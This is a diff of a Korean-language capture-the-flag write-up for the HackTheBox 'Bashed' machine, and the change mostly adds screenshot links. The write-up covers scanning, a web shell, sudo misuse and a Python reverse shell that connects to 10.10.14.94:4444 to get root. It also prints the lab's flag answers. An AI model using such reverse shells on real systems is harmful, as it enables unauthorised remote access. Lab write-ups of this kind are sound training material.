@@ -13,6 +13,7 @@
 ```bash
 nmap -sV -sC -oA nmap/Bashed 10.129.188.137
 ```
+![nmap](img/nmap.png)
 
 ```text
 PORT   STATE SERVICE VERSION
@@ -28,6 +29,8 @@ PORT   STATE SERVICE VERSION
 ```bash
 gobuster dir -u http://10.129.188.137/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
 ```
+![gobuster](img/gobuster.png)  
+![dev](img/dev.png)
 
 → `/dev` 디렉토리에 `phpbash.php` 확인
 
@@ -38,14 +41,18 @@ gobuster dir -u http://10.129.188.137/ -w /usr/share/wordlists/dirb/common.txt -
 ### 👤 Task 3: What user is the webserver running as on Bashed?
 
 `whoami` 명령 실행 결과:
+![phpbash](img/phpbash.png)
 
 **Answer**: `www-data`
 
 ---
 
-## 🧑‍💻 Submit User Flag
+## 🧑‍💻 Task 4 - Capture User Flag
 
-`cat /home/arrexel/user.txt`
+```bash
+cat /home/arrexel/user.txt
+```
+![userflag](img/userflag.png)
 
 **Answer**: `a8e03631cd4c2a095a4304b339d3d039`
 
@@ -56,6 +63,7 @@ gobuster dir -u http://10.129.188.137/ -w /usr/share/wordlists/dirb/common.txt -
 ```bash
 sudo -l
 ```
+![sudol](img/sudol.png)
 
 **Answer**: `scriptmanager`
 
@@ -66,6 +74,7 @@ sudo -l
 ```bash
 ls -al /
 ```
+![scripts](img/scripts.png)
 
 **Answer**: `/scripts`
 
@@ -83,16 +92,18 @@ sudo -u scriptmanager ls /scripts
 
 ---
 
-## 👑 Submit Root Flag
+## 👑 Task 8 - Capture Root Flag
 
-`test.py` 를 다음과 같이 수정:
+리버스 셸이 root로 연결되고, `/root/root.txt`에서 플래그 확인:
+![revshell](img/revshell.png)  
+![root](img/root.png)  
+![rootflag](img/rootflag.png)
 
 ```python
+# /scripts/test.py 내용
 import os
 os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.94/4444 0>&1'")
 ```
-
-리버스셸 연결 후:
 
 ```bash
 cat /root/root.txt
